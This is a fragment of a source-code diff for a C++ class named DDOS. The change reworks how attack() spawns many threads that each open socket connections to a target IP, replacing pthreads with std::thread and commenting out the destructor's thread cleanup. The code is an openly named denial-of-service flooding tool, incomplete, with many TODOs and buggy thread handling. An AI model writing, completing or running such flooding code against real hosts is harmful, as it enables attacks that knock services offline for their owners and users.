@@ -17,7 +17,7 @@ MAX_SUPER_INT DDOS::getFrequency() {
 
 bool DDOS::getProtocol() {
   // TODO:
-  // Check if protocol is valid !
+  // Assign protocol.
   return this->protocol;
 }
 
@@ -33,26 +33,24 @@ void* DDOS::goSocket(void *object) {
     connect(sock, (SOCKADDR*)&sin, sizeof(sin));
     // TODO: Check connect && return error bootstrap..
   }
-
-  pthread_exit(NULL);
 }
 
 void DDOS::attack() {
   if(!this->isIPv4()) {
     // TODO: Return error bootstrap.
   }
-  while (true) {
-    pthread_t threads[this->frequency];
-    for(int i = 0; i < this->frequency; i++)
-      int currentThreads = pthread_create(&threads[i], NULL, &DDOS::goSocket, this);
+
+  vector<thread> threads;
+  for (MAX_SUPER_INT i = 0; i < this->frequency; i++) {
+    threads.emplace_back(DDOS::goSocket, this);
   }
 }
 
-/*void DDOS::stop(vector<std::thread> threads) {
-
-}*/
-
 DDOS::~DDOS() {
-  // TODO:
-  // Destroy threads if frequency > 1.
+  /*
+    for (std::thread & t : threads) {
+        t.join();
+    }
+    threads.clear();
+  */
 }
